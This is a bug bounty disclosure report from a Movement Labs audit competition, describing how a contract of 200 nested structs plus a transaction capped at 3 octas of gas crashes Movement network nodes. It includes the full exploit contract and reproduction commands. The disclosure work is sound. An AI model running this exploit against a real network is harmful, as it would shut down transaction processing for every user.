# #42837 \[BC-Critical] total network shutdown

## #42837 \[BC-Critical] Total network shutdown

**Submitted on Mar 27th 2025 at 08:34:40 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42837
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement-aptos-core/tree/main>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

### Description

## Summary

This report is a straightforward demonstration of submitting a valid transaction to the REST API, which gets inserted into the mempool, sequenced for execution, and finally crashes all nodes executing the transaction.

## Impact

All nodes executing a transaction crash into an unrecoverable state.

## Is Aptos also vulnerable?

When I discovered the attack vector, I tested it against a local fork of Aptos' mainnet to confirm if Aptos was vulnerable.

Only the Movement Network is affected. Aptos is safe.

## Description

The vector causes a runtime panic at a specific point in a transaction's execution, unleashing a loop of more runtime panics. Finally, the node disconnects from the sequencer and stops responding.

To reproduce the bug, an attacker will:

* **Step 1.** Use the network's REST API to deploy a specific malicious move contract.
* **Step 2.** Use the network's REST API to submit a transaction with a "max gas" set to 3 Octas and interact with the malicious contract.

More details below.

### Step 1. Deploying the malicious move contract

#### 1.1 Creating the contract

The malicious move contract contains 200 structs that recursively implement each other. *(Compiling and deploying such code works perfectly fine in Aptos Network and Movement Network.)*

```
module addr::my_module {
		struct S0 has drop, key, store { variable: bool, }
		struct S1 has drop, key, store { variable: S0, }
		struct S2 has drop, key, store { variable: S1, }
		struct S3 has drop, key, store { variable: S2, }
		// .... more structs here 
		struct S200 has drop, key, store { variable: S199, }

		// .... more code here 

```

Then, we implement a public entry point named "`do_nothing`", which initializes a struct S200.

```
public entry fun do_nothing() {
		let resource = S200 { variable: S199 { variable: S198 { variable: S197 { variable: S196 { variable: S195 { variable: S194 { variable: S193 { variable: S192 { variable: S191 { variable: S190 { variable: S189 { variable: S188 { variable: S187 { variable: S186 { variable: S185 { variable: S184 { variable: S183 { variable: S182 { variable: S181 { variable: S180 { variable: S179 { variable: S178 { variable: S177 { variable: S176 { variable: S175 { variable: S174 { variable: S173 { variable: S172 { variable: S171 { variable: S170 { variable: S169 { variable: S168 { variable: S167 { variable: S166 { variable: S165 { variable: S164 { variable: S163 { variable: S162 { variable: S161 { variable: S160 { variable: S159 { variable: S158 { variable: S157 { variable: S156 { variable: S155 { variable: S154 { variable: S153 { variable: S152 { variable: S151 { variable: S150 { variable: S149 { variable: S148 { variable: S147 { variable: S146 { variable: S145 { variable: S144 { variable: S143 { variable: S142 { variable: S141 { variable: S140 { variable: S139 { variable: S138 { variable: S137 { variable: S136 { variable: S135 { variable: S134 { variable: S133 { variable: S132 { variable: S131 { variable: S130 { variable: S129 { variable: S128 { variable: S127 { variable: S126 { variable: S125 { variable: S124 { variable: S123 { variable: S122 { variable: S121 { variable: S120 { variable: S119 { variable: S118 { variable: S117 { variable: S116 { variable: S115 { variable: S114 { variable: S113 { variable: S112 { variable: S111 { variable: S110 { variable: S109 { variable: S108 { variable: S107 { variable: S106 { variable: S105 { variable: S104 { variable: S103 { variable: S102 { variable: S101 { variable: S100 { variable: S99 { variable: S98 { variable: S97 { variable: S96 { variable: S95 { variable: S94 { variable: S93 { variable: S92 { variable: S91 { variable: S90 { variable: S89 { variable: S88 { variable: S87 { variable: S86 { variable: S85 { variable: S84 { variable: S83 { variable: S82 { variable: S81 { variable: S80 { variable: S79 { variable: S78 { variable: S77 { variable: S76 { variable: S75 { variable: S74 { variable: S73 { variable: S72 { variable: S71 { variable: S70 { variable: S69 { variable: S68 { variable: S67 { variable: S66 { variable: S65 { variable: S64 { variable: S63 { variable: S62 { variable: S61 { variable: S60 { variable: S59 { variable: S58 { variable: S57 { variable: S56 { variable: S55 { variable: S54 { variable: S53 { variable: S52 { variable: S51 { variable: S50 { variable: S49 { variable: S48 { variable: S47 { variable: S46 { variable: S45 { variable: S44 { variable: S43 { variable: S42 { variable: S41 { variable: S40 { variable: S39 { variable: S38 { variable: S37 { variable: S36 { variable: S35 { variable: S34 { variable: S33 { variable: S32 { variable: S31 { variable: S30 { variable: S29 { variable: S28 { variable: S27 { variable: S26 { variable: S25 { variable: S24 { variable: S23 { variable: S22 { variable: S21 { variable: S20 { variable: S19 { variable: S18 { variable: S17 { variable: S16 { variable: S15 { variable: S14 { variable: S13 { variable: S12 { variable: S11 { variable: S10 { variable: S9 { variable: S8 { variable: S7 { variable: S6 { variable: S5 { variable: S4 { variable: S3 { variable: S2 { variable: S1 { variable: S0 { variable: true } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } };
}
```

Different operating systems have their own default and maximum stack size limits to prevent system crashes if a process allocates an excessively large stack (e.g., deep recursion); Linux has an 8 MB limit.

Compiling this move contract into bytecode requires a lot of deep recursion. Therefore, the next step for the attacker is to modify his own system's stack size limit. In the CLI he runs the following:

```
ulimit -s unlimited
```

> You can verify your system's stack size limit running `ulimit -s`. An output of "8192" means the stack size limit is 8MB.

Finally, the attacker compiles the move contract. A machine with 64 GB of RAM is more than enough for this step. Optionally, you can set the limit of the stack size back to what it was with:

```
ulimit -s 8192
```

#### 1.2 Deploying the contract

The attacker deploys the contract using:

```
movement move publish --url http://localhost:30731/v1/
```

The transaction will succeed.

> This binary can be deployed to either Aptos Network or Movement Network without issues. Both blockchains accept and deploy the bytecode.

### Step 2. Submit a transaction with a "max gas" set to 3 Octas and interact with the malicious contract

The minimum gas required for a transaction is 2\_760\_000 gas units (\~2.7 octas).

Assuming the address of the contract is `670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d`, use movement's CLI to submit a transaction that interacts with the `do_nothing` function, and set the **max-gas** parameter to the minimum gas required for a transaction to be accepted; 3 octas.

```
movement move run --function-id 670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d::my_module::do_nothing --gas-unit-price 100 --max-gas 3
```

To crash everything, the `max-gas` parameter must be **3**.

A transaction with a **max-gas** of 2 octas or less does not crash any node. They skip processing the transaction and return:

```
{
  "Error": "API error: API error Error(VmError): Invalid transaction: Type: Validation Code: MAX_GAS_UNITS_BELOW_MIN_TRANSACTION_GAS_UNITS"
}
```

A transaction with a **max-gas** of 4 octas or more does not crash any node. It returns the following error and continues operations as usual:

```
{
  "Error": "API error: Unknown error Transaction committed on chain, but failed execution: Execution failed in 0x670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d::my_module::do_nothing at code of
fset 128"
}
```

> Submitting the transaction with a **max-gas** of 3 octas to Aptos Network returns the error above (*"Execution failed at code offset 128"*) without crashing. Nodes crash only when submitting the transaction to Movement Network with a **max-gas** of 3 octas.

### After submitting the transaction

First, the AptosVM of Movement Labs crashes with the error:

```
Failed to execute block: task 643 panicked with message "Unexpected offsets. major_status: OUT_OF_GASsub_status: Nonelocation: Module(ModuleId { address: 0x670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d, name: Identifier(\"my_module\") })offsets: []"
```

Part of the stack backtrace:

```
Stack backtrace:
 ├─aptos_vm:;aptos_vm::AptosVM::execute_script_or_entry_function
 ├─aptos_vm::aptos_vm::AptosVM::execute_user_transaction_impl
 └─aptos_vm::aptos_vm::AptosVM::execute_user_transaction_with_custom_gas_meter
```

> For a complete stack backtrace, jump to the Proof of Concept section and follow the steps to reproduce the report. Then, review the stack backtrace in the `movement-full-node` process.

The runtime panic unwinds and panics again in a loop that lasts a few iterations.

Finally, the **Movement Light Node** stops streaming DA blobs.

> Review the logs in the `movement-celestia-da-light-node` process

### Proof of Concept

### Start the network

Follow the steps in the README.md of the Movement Network repo to start a local network with:

```
just movement-full-node native build.setup.celestia-local.eth-local
```

## Build and deploy the contract

Create a Move contract as usual with the following `Move.toml` file:

```
[package]
name = "project"
version = "1.0.0"
authors = []

[addresses]
addr = "670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d"

[dependencies.AptosFramework]
git = "https://github.com/movementlabsxyz/aptos-core.git"
rev = "movement"
subdir = "aptos-move/framework/aptos-framework"
```

The code for the Move contract (inside `./sources/addr.move`) is the following:

```
module addr::my_module {
		struct S0 has drop, key, store { variable: bool, }
		struct S1 has drop, key, store { variable: S0, }
		struct S2 has drop, key, store { variable: S1, }
		struct S3 has drop, key, store { variable: S2, }
		struct S4 has drop, key, store { variable: S3, }
		struct S5 has drop, key, store { variable: S4, }
		struct S6 has drop, key, store { variable: S5, }
		struct S7 has drop, key, store { variable: S6, }
		struct S8 has drop, key, store { variable: S7, }
		struct S9 has drop, key, store { variable: S8, }
		struct S10 has drop, key, store { variable: S9, }
		struct S11 has drop, key, store { variable: S10, }
		struct S12 has drop, key, store { variable: S11, }
		struct S13 has drop, key, store { variable: S12, }
		struct S14 has drop, key, store { variable: S13, }
		struct S15 has drop, key, store { variable: S14, }
		struct S16 has drop, key, store { variable: S15, }
		struct S17 has drop, key, store { variable: S16, }
		struct S18 has drop, key, store { variable: S17, }
		struct S19 has drop, key, store { variable: S18, }
		struct S20 has drop, key, store { variable: S19, }
		struct S21 has drop, key, store { variable: S20, }
		struct S22 has drop, key, store { variable: S21, }
		struct S23 has drop, key, store { variable: S22, }
		struct S24 has drop, key, store { variable: S23, }
		struct S25 has drop, key, store { variable: S24, }
		struct S26 has drop, key, store { variable: S25, }
		struct S27 has drop, key, store { variable: S26, }
		struct S28 has drop, key, store { variable: S27, }
		struct S29 has drop, key, store { variable: S28, }
		struct S30 has drop, key, store { variable: S29, }
		struct S31 has drop, key, store { variable: S30, }
		struct S32 has drop, key, store { variable: S31, }
		struct S33 has drop, key, store { variable: S32, }
		struct S34 has drop, key, store { variable: S33, }
		struct S35 has drop, key, store { variable: S34, }
		struct S36 has drop, key, store { variable: S35, }
		struct S37 has drop, key, store { variable: S36, }
		struct S38 has drop, key, store { variable: S37, }
		struct S39 has drop, key, store { variable: S38, }
		struct S40 has drop, key, store { variable: S39, }
		struct S41 has drop, key, store { variable: S40, }
		struct S42 has drop, key, store { variable: S41, }
		struct S43 has drop, key, store { variable: S42, }
		struct S44 has drop, key, store { variable: S43, }
		struct S45 has drop, key, store { variable: S44, }
		struct S46 has drop, key, store { variable: S45, }
		struct S47 has drop, key, store { variable: S46, }
		struct S48 has drop, key, store { variable: S47, }
		struct S49 has drop, key, store { variable: S48, }
		struct S50 has drop, key, store { variable: S49, }
		struct S51 has drop, key, store { variable: S50, }
		struct S52 has drop, key, store { variable: S51, }
		struct S53 has drop, key, store { variable: S52, }
		struct S54 has drop, key, store { variable: S53, }
		struct S55 has drop, key, store { variable: S54, }
		struct S56 has drop, key, store { variable: S55, }
		struct S57 has drop, key, store { variable: S56, }
		struct S58 has drop, key, store { variable: S57, }
		struct S59 has drop, key, store { variable: S58, }
		struct S60 has drop, key, store { variable: S59, }
		struct S61 has drop, key, store { variable: S60, }
		struct S62 has drop, key, store { variable: S61, }
		struct S63 has drop, key, store { variable: S62, }
		struct S64 has drop, key, store { variable: S63, }
		struct S65 has drop, key, store { variable: S64, }
		struct S66 has drop, key, store { variable: S65, }
		struct S67 has drop, key, store { variable: S66, }
		struct S68 has drop, key, store { variable: S67, }
		struct S69 has drop, key, store { variable: S68, }
		struct S70 has drop, key, store { variable: S69, }
		struct S71 has drop, key, store { variable: S70, }
		struct S72 has drop, key, store { variable: S71, }
		struct S73 has drop, key, store { variable: S72, }
		struct S74 has drop, key, store { variable: S73, }
		struct S75 has drop, key, store { variable: S74, }
		struct S76 has drop, key, store { variable: S75, }
		struct S77 has drop, key, store { variable: S76, }
		struct S78 has drop, key, store { variable: S77, }
		struct S79 has drop, key, store { variable: S78, }
		struct S80 has drop, key, store { variable: S79, }
		struct S81 has drop, key, store { variable: S80, }
		struct S82 has drop, key, store { variable: S81, }
		struct S83 has drop, key, store { variable: S82, }
		struct S84 has drop, key, store { variable: S83, }
		struct S85 has drop, key, store { variable: S84, }
		struct S86 has drop, key, store { variable: S85, }
		struct S87 has drop, key, store { variable: S86, }
		struct S88 has drop, key, store { variable: S87, }
		struct S89 has drop, key, store { variable: S88, }
		struct S90 has drop, key, store { variable: S89, }
		struct S91 has drop, key, store { variable: S90, }
		struct S92 has drop, key, store { variable: S91, }
		struct S93 has drop, key, store { variable: S92, }
		struct S94 has drop, key, store { variable: S93, }
		struct S95 has drop, key, store { variable: S94, }
		struct S96 has drop, key, store { variable: S95, }
		struct S97 has drop, key, store { variable: S96, }
		struct S98 has drop, key, store { variable: S97, }
		struct S99 has drop, key, store { variable: S98, }
		struct S100 has drop, key, store { variable: S99, }
		struct S101 has drop, key, store { variable: S100, }
		struct S102 has drop, key, store { variable: S101, }
		struct S103 has drop, key, store { variable: S102, }
		struct S104 has drop, key, store { variable: S103, }
		struct S105 has drop, key, store { variable: S104, }
		struct S106 has drop, key, store { variable: S105, }
		struct S107 has drop, key, store { variable: S106, }
		struct S108 has drop, key, store { variable: S107, }
		struct S109 has drop, key, store { variable: S108, }
		struct S110 has drop, key, store { variable: S109, }
		struct S111 has drop, key, store { variable: S110, }
		struct S112 has drop, key, store { variable: S111, }
		struct S113 has drop, key, store { variable: S112, }
		struct S114 has drop, key, store { variable: S113, }
		struct S115 has drop, key, store { variable: S114, }
		struct S116 has drop, key, store { variable: S115, }
		struct S117 has drop, key, store { variable: S116, }
		struct S118 has drop, key, store { variable: S117, }
		struct S119 has drop, key, store { variable: S118, }
		struct S120 has drop, key, store { variable: S119, }
		struct S121 has drop, key, store { variable: S120, }
		struct S122 has drop, key, store { variable: S121, }
		struct S123 has drop, key, store { variable: S122, }
		struct S124 has drop, key, store { variable: S123, }
		struct S125 has drop, key, store { variable: S124, }
		struct S126 has drop, key, store { variable: S125, }
		struct S127 has drop, key, store { variable: S126, }
		struct S128 has drop, key, store { variable: S127, }
		struct S129 has drop, key, store { variable: S128, }
		struct S130 has drop, key, store { variable: S129, }
		struct S131 has drop, key, store { variable: S130, }
		struct S132 has drop, key, store { variable: S131, }
		struct S133 has drop, key, store { variable: S132, }
		struct S134 has drop, key, store { variable: S133, }
		struct S135 has drop, key, store { variable: S134, }
		struct S136 has drop, key, store { variable: S135, }
		struct S137 has drop, key, store { variable: S136, }
		struct S138 has drop, key, store { variable: S137, }
		struct S139 has drop, key, store { variable: S138, }
		struct S140 has drop, key, store { variable: S139, }
		struct S141 has drop, key, store { variable: S140, }
		struct S142 has drop, key, store { variable: S141, }
		struct S143 has drop, key, store { variable: S142, }
		struct S144 has drop, key, store { variable: S143, }
		struct S145 has drop, key, store { variable: S144, }
		struct S146 has drop, key, store { variable: S145, }
		struct S147 has drop, key, store { variable: S146, }
		struct S148 has drop, key, store { variable: S147, }
		struct S149 has drop, key, store { variable: S148, }
		struct S150 has drop, key, store { variable: S149, }
		struct S151 has drop, key, store { variable: S150, }
		struct S152 has drop, key, store { variable: S151, }
		struct S153 has drop, key, store { variable: S152, }
		struct S154 has drop, key, store { variable: S153, }
		struct S155 has drop, key, store { variable: S154, }
		struct S156 has drop, key, store { variable: S155, }
		struct S157 has drop, key, store { variable: S156, }
		struct S158 has drop, key, store { variable: S157, }
		struct S159 has drop, key, store { variable: S158, }
		struct S160 has drop, key, store { variable: S159, }
		struct S161 has drop, key, store { variable: S160, }
		struct S162 has drop, key, store { variable: S161, }
		struct S163 has drop, key, store { variable: S162, }
		struct S164 has drop, key, store { variable: S163, }
		struct S165 has drop, key, store { variable: S164, }
		struct S166 has drop, key, store { variable: S165, }
		struct S167 has drop, key, store { variable: S166, }
		struct S168 has drop, key, store { variable: S167, }
		struct S169 has drop, key, store { variable: S168, }
		struct S170 has drop, key, store { variable: S169, }
		struct S171 has drop, key, store { variable: S170, }
		struct S172 has drop, key, store { variable: S171, }
		struct S173 has drop, key, store { variable: S172, }
		struct S174 has drop, key, store { variable: S173, }
		struct S175 has drop, key, store { variable: S174, }
		struct S176 has drop, key, store { variable: S175, }
		struct S177 has drop, key, store { variable: S176, }
		struct S178 has drop, key, store { variable: S177, }
		struct S179 has drop, key, store { variable: S178, }
		struct S180 has drop, key, store { variable: S179, }
		struct S181 has drop, key, store { variable: S180, }
		struct S182 has drop, key, store { variable: S181, }
		struct S183 has drop, key, store { variable: S182, }
		struct S184 has drop, key, store { variable: S183, }
		struct S185 has drop, key, store { variable: S184, }
		struct S186 has drop, key, store { variable: S185, }
		struct S187 has drop, key, store { variable: S186, }
		struct S188 has drop, key, store { variable: S187, }
		struct S189 has drop, key, store { variable: S188, }
		struct S190 has drop, key, store { variable: S189, }
		struct S191 has drop, key, store { variable: S190, }
		struct S192 has drop, key, store { variable: S191, }
		struct S193 has drop, key, store { variable: S192, }
		struct S194 has drop, key, store { variable: S193, }
		struct S195 has drop, key, store { variable: S194, }
		struct S196 has drop, key, store { variable: S195, }
		struct S197 has drop, key, store { variable: S196, }
		struct S198 has drop, key, store { variable: S197, }
		struct S199 has drop, key, store { variable: S198, }
		struct S200 has drop, key, store { variable: S199, }

		public fun always_true(): bool {
				true
		}

		public entry fun do_nothing() {
				let resource = S200 { variable: S199 { variable: S198 { variable: S197 { variable: S196 { variable: S195 { variable: S194 { variable: S193 { variable: S192 { variable: S191 { variable: S190 { variable: S189 { variable: S188 { variable: S187 { variable: S186 { variable: S185 { variable: S184 { variable: S183 { variable: S182 { variable: S181 { variable: S180 { variable: S179 { variable: S178 { variable: S177 { variable: S176 { variable: S175 { variable: S174 { variable: S173 { variable: S172 { variable: S171 { variable: S170 { variable: S169 { variable: S168 { variable: S167 { variable: S166 { variable: S165 { variable: S164 { variable: S163 { variable: S162 { variable: S161 { variable: S160 { variable: S159 { variable: S158 { variable: S157 { variable: S156 { variable: S155 { variable: S154 { variable: S153 { variable: S152 { variable: S151 { variable: S150 { variable: S149 { variable: S148 { variable: S147 { variable: S146 { variable: S145 { variable: S144 { variable: S143 { variable: S142 { variable: S141 { variable: S140 { variable: S139 { variable: S138 { variable: S137 { variable: S136 { variable: S135 { variable: S134 { variable: S133 { variable: S132 { variable: S131 { variable: S130 { variable: S129 { variable: S128 { variable: S127 { variable: S126 { variable: S125 { variable: S124 { variable: S123 { variable: S122 { variable: S121 { variable: S120 { variable: S119 { variable: S118 { variable: S117 { variable: S116 { variable: S115 { variable: S114 { variable: S113 { variable: S112 { variable: S111 { variable: S110 { variable: S109 { variable: S108 { variable: S107 { variable: S106 { variable: S105 { variable: S104 { variable: S103 { variable: S102 { variable: S101 { variable: S100 { variable: S99 { variable: S98 { variable: S97 { variable: S96 { variable: S95 { variable: S94 { variable: S93 { variable: S92 { variable: S91 { variable: S90 { variable: S89 { variable: S88 { variable: S87 { variable: S86 { variable: S85 { variable: S84 { variable: S83 { variable: S82 { variable: S81 { variable: S80 { variable: S79 { variable: S78 { variable: S77 { variable: S76 { variable: S75 { variable: S74 { variable: S73 { variable: S72 { variable: S71 { variable: S70 { variable: S69 { variable: S68 { variable: S67 { variable: S66 { variable: S65 { variable: S64 { variable: S63 { variable: S62 { variable: S61 { variable: S60 { variable: S59 { variable: S58 { variable: S57 { variable: S56 { variable: S55 { variable: S54 { variable: S53 { variable: S52 { variable: S51 { variable: S50 { variable: S49 { variable: S48 { variable: S47 { variable: S46 { variable: S45 { variable: S44 { variable: S43 { variable: S42 { variable: S41 { variable: S40 { variable: S39 { variable: S38 { variable: S37 { variable: S36 { variable: S35 { variable: S34 { variable: S33 { variable: S32 { variable: S31 { variable: S30 { variable: S29 { variable: S28 { variable: S27 { variable: S26 { variable: S25 { variable: S24 { variable: S23 { variable: S22 { variable: S21 { variable: S20 { variable: S19 { variable: S18 { variable: S17 { variable: S16 { variable: S15 { variable: S14 { variable: S13 { variable: S12 { variable: S11 { variable: S10 { variable: S9 { variable: S8 { variable: S7 { variable: S6 { variable: S5 { variable: S4 { variable: S3 { variable: S2 { variable: S1 { variable: S0 { variable: true } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } };
		}

		#[test_only]
		use std::signer;

		#[test(account = @0xC0FFEE)]
		public fun test_helloworld(account: &signer) {
				let test_account = signer::address_of(account);
				do_nothing();
		}
}
```

Use `movement init` to initialize a profile. My profile (inside `.movement/config.yaml`) is:

```
---
profiles:
  default:
    network: Custom
    private_key: "0xff4665d1a0e3fedb82a8dc1ed573ba450be7acc6bee896da2a917275f591006e"
    public_key: "0xd9c819e898975b94eaca5ee01f25a9864a42afaa865799180e7f884164e9dac9"
    account: 670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d
    rest_url: "http://localhost:30731/v1/"
    faucet_url: "http://localhost:30732/"
```

> This step should create and fund your account using the Faucet, giving you enough funds to deploy the Move contract and interact with it later.

In a new terminal split, enter sudo:

```
sudo su
```

Then, change the stack limit of the system, allowing you to compile the code into binary without overflowing your system stack due to recursion:

```
ulimit -s unlimited
```

Deploy the binary to the chain:

```
movement move publish --url http://localhost:30731/v1/
```

Finally, interact with it by sending a transaction with a **max-gas** of 3 octas:

```
movement move run --function-id 670c9d8c9ca3b3c938fcf0fe80abc3c9a06944a6e3f9104755a05baf2c2ef85d::my_module::do_nothing --gas-unit-price 100 --max-gas 3
```
